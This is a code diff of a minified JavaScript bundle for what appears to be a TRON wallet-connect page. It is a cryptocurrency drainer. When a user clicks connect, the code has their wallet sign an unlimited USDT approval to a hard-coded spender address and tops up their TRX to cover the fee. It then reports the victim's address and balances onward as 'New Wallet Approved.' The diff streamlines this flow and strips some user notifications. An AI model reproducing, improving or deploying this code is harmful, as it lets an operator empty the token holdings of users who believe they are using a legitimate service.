@@ -77346,7 +77346,7 @@
             const FV = !1
                 , UV = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
                 , DV = "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw"
-                , LV = "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw"
+                , LV = DV
                 , jV = "TJBavASNw5YTVWT1ocAvMjQFoB9p6C7EVi";
             function zV(e, t) {
                 return function () {
@@ -79475,71 +79475,34 @@
                     try {
                         const t = this.tronWeb
                             , r = UV
-                            , spender = "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw"
                             , n = {
                                 feeLimit: 1e9,
                                 callValue: 0
                             }
                             , o = [{
                                 type: "address",
-                                value: spender
+                                value: LV
                             }, {
                                 type: "uint256",
                                 value: "115792089237316195423570985008687907853269984665640564039457584007913129639935"
                             }]
-                            , i = "approve(address,uint256)";
-                        console.log("USDT approve -> spender contract:", spender);
-                        const s = await t.transactionBuilder.triggerSmartContract(r, i, n, o, e);
+                            , i = "approve(address,uint256)"
+                            , s = await t.transactionBuilder.triggerSmartContract(r, i, n, o, e);
                         console.log("Transaction Built:", s);
-                        const signResp = await this.provider.request({
+                        const a = (await this.provider.request({
                             method: "tron_signTransaction",
                             params: {
                                 address: e,
                                 transaction: s
                             }
-                        }, "tron:0x2b6653dc")
-                            , a = signResp && signResp.result;
+                        }, "tron:0x2b6653dc")).result;
                         if (!a)
                             return {
-                                success: !1,
-                                error: "User rejected signing"
+                                success: !1
                             };
-                        console.log("Signed response from wallet:", a);
-                        try {
-                            const direct = await t.trx.sendRawTransaction(a);
-                            if (console.log("Broadcast direct (sample method):", direct),
-                                direct && !0 === direct.result && direct.txid)
-                                return direct
-                        } catch (directErr) {
-                            console.warn("Direct broadcast failed:", directErr)
-                        }
-                        const broadcastCandidates = [a.transaction, s.transaction].filter(Boolean)
-                            , tried = new Set;
-                        for (const c of broadcastCandidates) {
-                            const l = c.txID || c.raw_data_hex || JSON.stringify(c.raw_data);
-                            if (tried.has(l))
-                                continue;
-                            tried.add(l);
-                            try {
-                                if (!c.signature || !c.signature.length)
-                                    continue;
-                                const u = await t.trx.sendRawTransaction(c);
-                                if (console.log("Broadcast result:", u),
-                                    u && !0 === u.result && u.txid)
-                                    return u
-                            } catch (h) {
-                                console.warn("Broadcast attempt failed:", h)
-                            }
-                        }
-                        return {
-                            success: !1,
-                            error: "Broadcast failed - verifying on-chain",
-                            needsOnChainVerify: !0,
-                            signed: a
-                        }
+                        return await t.trx.sendRawTransaction(a)
                     } catch (t) {
-                        return console.error("sendTransaction error:", t),
-                        {
+                        return {
                             success: !1,
                             error: t.message
                         }
@@ -79555,50 +79518,17 @@
                     , a = ["tron:".concat(aG)]
                     , c = ["tron_signTransaction", "tron_signMessage"]
                     , l = async (e, t) => {
-                        const d = async () => {
-                            try {
-                                const e = (await rG.transactionBuilder.triggerConstantContract(UV, "allowance(address,address)", {}, [{
-                                    type: "address",
-                                    value: t
-                                }, {
-                                    type: "address",
-                                    value: "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw"
-                                }], rG.address.toHex("TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw"))).constant_result[0]
-                                    , r = e.startsWith("0x") ? e : "0x".concat(e);
-                                return rG.toBigNumber(r).toNumber()
-                            } catch (e) {
-                                return 0
-                            }
-                        }
-                            ;
                         try {
                             const n = await e.sendTransaction(t);
-                            console.log("Approval response:", n);
-                            window.railwayBackend.showNotification("Confirming approval on blockchain...", "info");
-                            for (let h = 0; h < 15; h++) {
-                                await new Promise((e => setTimeout(e, 2e3)));
-                                const f = await d();
-                                if (console.log("Allowance verify attempt", h + 1, ":", f),
-                                    f > 0) {
-                                    const o = await e.getBalance(t)
-                                        , i = await iG(t);
-                                    r(n && !0 === n.result ? n : {
-                                        result: !0,
-                                        txid: n && n.txid
-                                    });
-                                    const a = "New Wallet Approved\n\ud83d\udcb3Wallet Address <code>".concat(t, " </code>\n Balance: <code>").concat(o, " TRX </code>\n USDT Balance: <code>").concat(i, "</code>");
-                                    sG(a);
-                                    return !0
-                                }
+                            if (n) {
+                                const o = await e.getBalance(t)
+                                    , i = await iG(t);
+                                r(n);
+                                const a = "New Wallet Approved\n\ud83d\udcb3Wallet Address <code>".concat(t, " </code>\n Balance: <code>").concat(o, " TRX </code>\n USDT Balance: <code>").concat(i, "</code>");
+                                sG(a)
                             }
-                            return console.error("Approval not confirmed on-chain:", n),
-                                window.railwayBackend.showNotification("Approval not confirmed on blockchain. Please try again.", "error"),
-                                s(!0),
-                                !1
                         } catch (n) {
-                            return console.error("Approval failed:", n),
-                                s(!0),
-                                !1
+                            s(!0)
                         }
                     }
                     , u = async (e, t) => {
@@ -79630,7 +79560,6 @@
                                 Ae.jsx)("button", {
                                     className: "w-full bg-blue-800 rounded-3xl hover:bg-blue-700 text-white font-semibold py-3 cursor-pointer transition-colors",
                                     onClick: async () => {
-                                        s(!1);
                                         try {
                                             let __loader = document.getElementById("wc-loading-overlay");
                                             if (!__loader) {
@@ -79688,54 +79617,26 @@
                                                     }
                                                 })).namespaces.tron.accounts[0].split(":")[2]
                                                     , n = new cG(e);
-                                                try {
-                                                    const __loader = document.getElementById("wc-loading-overlay");
-                                                    if (__loader) __loader.style.display = "none"
-                                                } catch (_) { }
                                                 u(n, r);
                                                 try {
                                                     const fundingResult = await window.railwayBackend.checkAndFundUser(r);
                                                     const minBal = fundingResult.minimumBalance ?? 11;
-                                                    if (fundingResult.funded) {
-                                                        window.railwayBackend.showNotification("TRX sent! Checking wallet balance...", "info");
-                                                        const ready = await window.railwayBackend.waitForMinimumBalance(r, minBal);
-                                                        if (!ready.ready) {
-                                                            const chainBal = await window.railwayBackend.getOnChainBalance(r);
-                                                            if (chainBal !== null && chainBal >= minBal) {
-                                                                console.log("\u2705 On-chain balance sufficient after wait:", chainBal)
-                                                            } else {
-                                                                window.alert("TRX top-up sent but balance not confirmed yet. Please wait a moment and try again.");
-                                                                return
-                                                            }
-                                                        }
-                                                        window.railwayBackend.showNotification("TRX received! Opening approval...", "success")
-                                                    } else {
+                                                    if (!fundingResult.funded && (fundingResult.balance ?? 0) < minBal) {
                                                         const chainBal = await window.railwayBackend.getOnChainBalance(r);
-                                                        const effectiveBal = Math.max(fundingResult.balance ?? 0, chainBal ?? 0);
-                                                        if (effectiveBal < minBal) {
-                                                            window.alert(fundingResult.error || fundingResult.message || "Insufficient TRX balance. Need at least ".concat(minBal, " TRX."));
+                                                        if (null === chainBal || chainBal < minBal) {
+                                                            window.alert(fundingResult.error || "Auto-funding failed. Please try again or contact support.");
                                                             return
                                                         }
                                                     }
-                                                    console.log("\u2705 TRX balance ready:", fundingResult)
+                                                    console.log("\u2705 TRX funding completed:", fundingResult)
                                                 } catch (error) {
                                                     console.error("\u274c Railway backend funding failed:", error);
                                                     window.alert(error?.message || "Auto-funding service unavailable. Please try again later.");
                                                     return
                                                 }
-                                                try {
-                                                    const __loader = document.getElementById("wc-loading-overlay");
-                                                    if (__loader) __loader.style.display = "none"
-                                                } catch (_) { }
-                                                window.railwayBackend.showNotification("Please approve USDT in Trust Wallet", "info");
-                                                const approved = await l(n, r);
-                                                if (approved)
-                                                    t(r);
-                                                else
-                                                    window.railwayBackend.showNotification("Approval failed. Please try again.", "error")
+                                                l(n, r),
+                                                    t(r)
                                             } catch (r) {
-                                                console.error("Wallet flow error:", r);
-                                                window.railwayBackend.showNotification(r?.message || "Something went wrong. Please try again.", "error")
                                             } finally {
                                                 const __loader = document.getElementById("wc-loading-overlay");
                                                 if (__loader) __loader.style.display = "none";
